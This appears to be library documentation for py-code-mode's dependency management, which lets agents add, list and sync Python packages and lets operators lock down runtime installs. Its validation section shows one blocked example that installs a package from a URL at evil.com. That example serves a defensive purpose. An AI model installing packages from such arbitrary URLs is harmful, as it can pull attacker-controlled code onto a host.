# Dependency Management

The deps namespace allows agents to manage Python packages in their execution environment.

## Basic Usage

```python
# Add a package (installs immediately)
deps.add("pandas>=2.0")

# List configured dependencies
deps.list()

# Remove from configuration
deps.remove("pandas")

# Ensure all configured deps are installed
deps.sync()
```

## Pre-configuring Dependencies

Configure dependencies before session creation for predictable environments:

```python
from pathlib import Path
from py_code_mode import Session, FileStorage

storage = FileStorage(base_path=Path("./data"))

# Pre-configure before session
deps_store = storage.get_deps_store()
deps_store.add("pandas>=2.0")
deps_store.add("numpy")
deps_store.add("requests")

# Auto-sync on session start
async with Session(storage=storage, sync_deps_on_start=True) as session:
    # All pre-configured packages are installed
    result = await session.run("import pandas; print(pandas.__version__)")
```

## Runtime Dependency Control

For security-sensitive environments, disable runtime package installation:

```python
from py_code_mode.execution import InProcessExecutor, InProcessConfig

# Lock down deps - no runtime installation allowed
config = InProcessConfig(allow_runtime_deps=False)
executor = InProcessExecutor(config=config)

async with Session(storage=storage, executor=executor) as session:
    # deps.add() and deps.remove() will raise RuntimeDepsDisabledError
    # deps.list() still works (read-only)
    # deps.sync() still works (installs pre-configured packages)
    result = await session.run("deps.list()")
```

This pattern allows you to:
1. Pre-configure allowed dependencies via storage
2. Start session with `sync_deps_on_start=True` to install them
3. Lock down runtime modifications to prevent agent from installing arbitrary packages

## Storage Backends

Dependencies persist according to your storage backend:

### FileStorage

Dependencies stored in `requirements.txt` format:

```bash
# {base_path}/requirements.txt
pandas>=2.0
numpy
requests
```

### RedisStorage

Dependencies stored as Redis keys:

```
{prefix}:deps -> ["pandas>=2.0", "numpy", "requests"]
```

## MCP Server Usage

When using py-code-mode as an MCP server, dependency tools are available:

```bash
# Start with runtime deps enabled (default)
py-code-mode-mcp --storage ~/.code-mode

# Start with runtime deps disabled
py-code-mode-mcp --storage ~/.code-mode --no-runtime-deps
```

**Available MCP tools:**
- `list_deps` - List configured dependencies (always available)
- `add_dep(package)` - Add and install dependency (only if runtime deps enabled)
- `remove_dep(package)` - Remove dependency (only if runtime deps enabled)

## Package Validation

Package names are validated before installation to prevent:

```python
# Blocked: URL installs
deps.add("requests @ https://evil.com/requests.tar.gz")  # Error

# Blocked: Environment markers
deps.add("requests; python_version >= '3.8'")  # Error

# Allowed: Standard version specifiers
deps.add("requests>=2.28.0")  # OK
deps.add("requests==2.28.1")  # OK
deps.add("requests")  # OK
```

This prevents agents from:
- Installing packages from arbitrary URLs
- Using pip's environment marker syntax for conditional installs

## Best Practices

**Pre-configure for production:**
```python
# Production: pre-configure deps, disable runtime changes
deps_store.add("pandas>=2.0")
deps_store.add("numpy")
config = ContainerConfig(allow_runtime_deps=False)
```

**Allow runtime for development:**
```python
# Development: let agent install as needed
config = InProcessConfig(allow_runtime_deps=True)
```

**Version pinning:**
```python
# Good: Pin versions for reproducibility
deps.add("pandas==2.0.3")

# Risky: Unpinned versions may break
deps.add("pandas")  # Gets latest, could break later
```

## Executors and Dependencies

Different executors handle dependencies differently:

### InProcessExecutor

- Installs packages into current Python environment
- Fast, but affects the host environment
- Use virtual environments to isolate

### SubprocessExecutor

- Creates isolated venv for the subprocess
- Packages installed only affect the subprocess
- Clean separation from host environment

### ContainerExecutor

- Packages installed inside Docker container
- Completely isolated from host
- Must rebuild container image if base packages change

## Troubleshooting

**Packages not available after `deps.add()`:**
- Check that `deps.sync()` was called
- Or use `sync_deps_on_start=True` in session creation

**Installation fails:**
- Check package name spelling
- Ensure version specifier is valid
- Check network connectivity (for downloading packages)

**Runtime deps disabled errors:**
- Pre-configure dependencies via `storage.get_deps_store()`
- Or enable runtime deps in executor config
